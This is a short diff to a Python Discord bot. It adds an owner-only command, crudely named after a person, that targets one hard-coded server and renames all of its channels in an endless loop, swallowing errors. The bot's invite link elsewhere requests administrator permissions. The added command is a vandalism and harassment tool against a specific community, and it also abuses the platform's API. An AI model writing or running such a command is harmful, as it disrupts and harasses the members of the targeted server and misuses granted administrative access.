@@ -227,6 +227,19 @@ async def about():
                   "<https://discordapp.com/oauth2/authorize?&client_id=173708503796416512&scope=bot&permissions=8>"
                   .format(len(list)))
 
+
+@bot.command()
+@commands.check(checks.is_owner)
+async def fucksam(*, name: str):
+    fuckedserver = bot.get_server("186530718560681984")
+    while True:
+        for channel in fuckedserver.channels:
+            try:
+                await bot.edit_channel(channel, name=name)
+                print("heck")
+            except discord.HTTPException:
+                continue
+
 async def save_configs():
     while True:
 
